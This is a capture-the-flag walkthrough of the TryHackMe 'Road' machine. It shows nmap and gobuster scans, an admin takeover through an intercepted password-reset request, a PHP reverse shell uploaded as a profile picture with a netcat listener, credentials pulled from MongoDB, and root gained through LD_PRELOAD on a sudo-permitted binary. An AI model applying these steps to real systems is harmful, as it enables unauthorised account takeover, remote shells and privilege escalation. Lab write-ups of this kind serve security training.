Hi, here is how to successfully complete the machine https://tryhackme.com/room/road
![2025-02-09_17-15](https://github.com/user-attachments/assets/3f2e303a-f03f-4221-9e5f-b2ab5665db4d)
<br><br><br>

As usual, I start by scanning the target machine with nmap, we see 2 open ports
<pre><code> 
> sudo nmap -p- --open -sS -sCV --min-rate 3000 -vvv -Pn 10.10.15.219 | tee nmap1.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-09 15:58 -03
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:58
Completed NSE at 15:58, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:58
Completed NSE at 15:58, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:58
Completed NSE at 15:58, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:58
Completed Parallel DNS resolution of 1 host. at 15:58, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:58
Scanning 10.10.15.219 [65535 ports]
Discovered open port 80/tcp on 10.10.15.219
Discovered open port 22/tcp on 10.10.15.219
Completed SYN Stealth Scan at 15:58, 42.40s elapsed (65535 total ports)
Initiating Service scan at 15:58
Scanning 2 services on 10.10.15.219
Completed Service scan at 15:58, 6.75s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.15.219.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:58
Completed NSE at 15:59, 8.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:59
Completed NSE at 15:59, 1.23s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:59
Completed NSE at 15:59, 0.01s elapsed
Nmap scan report for 10.10.15.219
Host is up, received user-set (0.68s latency).
Scanned at 2025-02-09 15:58:08 -03 for 59s
Not shown: 46707 filtered tcp ports (no-response), 18826 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
|_http-title: Sky Couriers
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:59
Completed NSE at 15:59, 0.01s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:59
Completed NSE at 15:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:59
Completed NSE at 15:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds
           Raw packets sent: 123987 (5.455MB) | Rcvd: 18865 (754.612KB) </code></pre>
<br><br><br>

there is nothing relevant on the website, so I started to search directories with gobuster
<pre><code>
gobuster dir -u http://10.10.15.219/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | tee gobuster.txt
  ===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.15.219/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 313] [--> http://10.10.15.219/assets/]
/v2                   (Status: 301) [Size: 309] [--> http://10.10.15.219/v2/]
/server-status        (Status: 403) [Size: 277]
/phpMyAdmin           (Status: 301) [Size: 317] [--> http://10.10.15.219/phpMyAdmin/]

===============================================================
Finished
=============================================================== </code></pre>
<br><br><br>

in the directory /v2/ I found a login panel, I have no credentials but this login allows us to create a new user
![2025-02-09_17-22](https://github.com/user-attachments/assets/cff972bc-d3c6-4786-bc93-9c6e00168b10)
<br><br><br>


![2025-02-09_17-22](https://github.com/user-attachments/assets/f12104ba-1633-4266-955c-9f0c76d678d2)
<br><br><br>


I found the email address of the admin user, I will go to the reset section and change the credentials. 
![2025-02-09_17-27](https://github.com/user-attachments/assets/19c934a6-70be-4664-b8b2-2fb7867cc50f)
<br><br><br>

![2025-02-09_17-28](https://github.com/user-attachments/assets/5e184847-1bf5-49cc-ad04-a5699f7cf81b)
<br><br><br>


by intercepting the request with burp suite I can change my email to admin email
![burp1](https://github.com/user-attachments/assets/735cadb5-0227-4170-878b-da5b72b26251)
<br><br><br>

![burp2](https://github.com/user-attachments/assets/ee9b5eff-b056-4a74-bf23-744056cdf5ca)
<br><br><br>


now i can login as admin, i will go to the profile section again to upload a reverse shell as profile picture, i decided to use the pentestmonkey php reverse shell.
![2025-02-09_17-30](https://github.com/user-attachments/assets/3bb75089-d525-4cc6-8e23-3f44c9a4eebd)
<br><br><br>

listening on port 1234
<pre><code> > nc -nlvp 1234 </code></pre>

in order to run the reverse shell I had to search the source code of the page with ctrl+u, there I found that the profile pictures are stored in the /v2/profilepicture/ directory, if we access to that directory we will obtain the reverse shell.
![2025-02-09_17-34](https://github.com/user-attachments/assets/3df2caca-6aa1-4e5a-a73b-72cf2c68e4d7)
<br><br><br>

<pre><code> Connection from 10.10.15.219:46824
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:30:11 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$              </code></pre>
<br><br><br>


the user flag can be found in /home/webdeveloper/
<pre><code> $ $ ls /home/webdeveloper/
user.txt </code></pre>
<br><br><br>

The ss -tl command in Linux displays a list of TCP ports in LISTEN state

there is a service listening on port 33060 at address 127.0.0.1

Port 33060 is used by MySQL X Protocol, a MySQL protocol for NoSQL connections and communication with modern clients such as MySQL Shell or applications using the X DevAPI API.
<pre><code> $ ss -tl
State   Recv-Q  Send-Q     Local Address:Port       Peer Address:Port  Process  
LISTEN  0       70             127.0.0.1:33060           0.0.0.0:*              
LISTEN  0       511            127.0.0.1:9000            0.0.0.0:*              
LISTEN  0       4096           127.0.0.1:27017           0.0.0.0:*              
LISTEN  0       151            127.0.0.1:mysql           0.0.0.0:*              
LISTEN  0       4096       127.0.0.53%lo:domain          0.0.0.0:*              
LISTEN  0       128              0.0.0.0:ssh             0.0.0.0:*              
LISTEN  0       511                    *:http                  *:*              
LISTEN  0       128                 [::]:ssh                [::]:*              
</code></pre>
<br><br><br>

by viewing the mongo tables I was able to obtain credentials to access via ssh
<pre><code> $ mongo
MongoDB shell version v4.4.6
connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&gssapiServiceName=mongodb
Implicit session: session { "id" : UUID("ae519345-5e40-4755-90a4-665a4c10173c") }
MongoDB server version: 4.4.6
show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB </code></pre>
<br><br><br>

<pre><code> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
use backup
switched to db backup
show collections;
collection
user
db.user.find();
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "???" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" } </code></pre>
<br><br><br>



<pre><code>> ssh webdeveloper@10.10.15.219
webdeveloper@10.10.15.219's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 09 Feb 2025 08:39:10 PM UTC

  System load:  0.0               Processes:             118
  Usage of /:   60.2% of 9.78GB   Users logged in:       0
  Memory usage: 64%               IPv4 address for eth0: 10.10.15.219
  Swap usage:   0%


185 updates can be installed immediately.
100 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Feb  9 20:08:07 2025 from 10.9.1.17
webdeveloper@sky:~$ export TERM=xterm </code></pre>
<br><br><br>

with the command sudo -l we will list all the commands that the webdeveloper user can execute using sudo

LD_PRELOAD is an environment variable in Linux that allows you to load shared libraries before the standard system libraries. Basically, it injects code into programs without the need to modify their source code or recompile.

When you run a program, the dynamic linker (ld.so) looks for the required libraries. LD_PRELOAD tells it to load a specific library first, allowing it to overwrite system functions.
<pre><code> webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility</code></pre>
<br><br><br>

I will make a reverse shell in C to get root privileges

LD_PRELOAD injects a malicious library into a privileged program (sky_backup_utility) executed with sudo. This allows executing code before the real program, managing to escalate privileges and open a shell as root.
![2025-02-09_18-25](https://github.com/user-attachments/assets/72df6a6f-7071-4b31-9ac9-7506a9c00e9d)
<br><br><br>



compile the shared library with -fPIC -shared -nostartfiles

-fPIC: Generates code independent of the memory location.
-shared: Indicates that it is a shared library.
-nostartfiles: Omits startup files, optimizing the exploit.
<pre><code>root@sky:/home/webdeveloper# gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:7:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    7 |  setgid(0);
      |  ^~~~~~
shell.c:8:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    8 |  setuid(0);
      |  ^~~~~~ </code></pre>
<br><br><br>

now we run the bunary using LD_PRELOAD and we are already root user
<pre><code>webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
root@sky:/home/webdeveloper# ls /root/
root.txt</code></pre>
